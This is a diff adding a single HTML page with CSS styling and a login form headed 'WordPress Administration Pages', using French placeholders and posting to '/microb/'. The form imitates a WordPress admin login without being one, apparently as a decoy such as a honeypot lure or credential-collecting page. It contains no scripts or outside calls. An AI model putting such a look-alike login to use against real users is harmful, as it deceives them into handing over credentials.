@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Administration Pages</title>
+    <style>
+        /* Resetting some default styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f7f7f7;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        ul {
+            list-style-type: none;
+            padding: 0;
+            width: max-content; /* making the ul only as wide as its content */
+            text-align: center; /* centering the list items within the ul */
+        }
+
+        li {
+            margin: 10px 0; /* space above and below the items */
+        }
+
+        input[type="text"], input[type="password"] {
+            padding: 10px 15px;
+            font-size: 1em;
+            border: 1px solid #ccc;
+            border-radius: 20px; /* Makes the input fields rounded */
+            width: 50%;
+            box-sizing: border-box;
+            margin: 10px 0; /* Adds some space between inputs */
+            placeholder: grey; /* Placeholder color (might vary by browser) */
+        }
+
+        /* Button styles */
+        .button {
+            display: inline-block;
+            background-color: #007BFF; /* Default button color */
+            color: white;
+            text-align: center;
+            border-radius: 4px;
+            padding: 7px 12px;
+            font-size: 0.85em;
+            text-decoration: none;
+            width: 25%; /* Makes button as wide as input fields */
+            box-sizing: border-box;
+            border-radius: 20px; /* Makes the button rounded */
+            transition: background-color 0.3s;
+            margin-top: 20px;
+        }
+
+        .button:hover {
+            background-color: #0056b3; /* Darker shade on hover */
+        }
+
+    </style>
+</head>
+<body>
+    <h1>WordPress Administration Pages</h1>
+    <form method="POST" action="/microb/" style="display: flex; flex-direction: column; align-items: center; width: 50%;">
+        <input type="text" id="username" name="username" placeholder="Utilisateur" required>
+        <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+        <input type="submit" value="Log In" class="button">
+    </form>
+</body>
+</html>
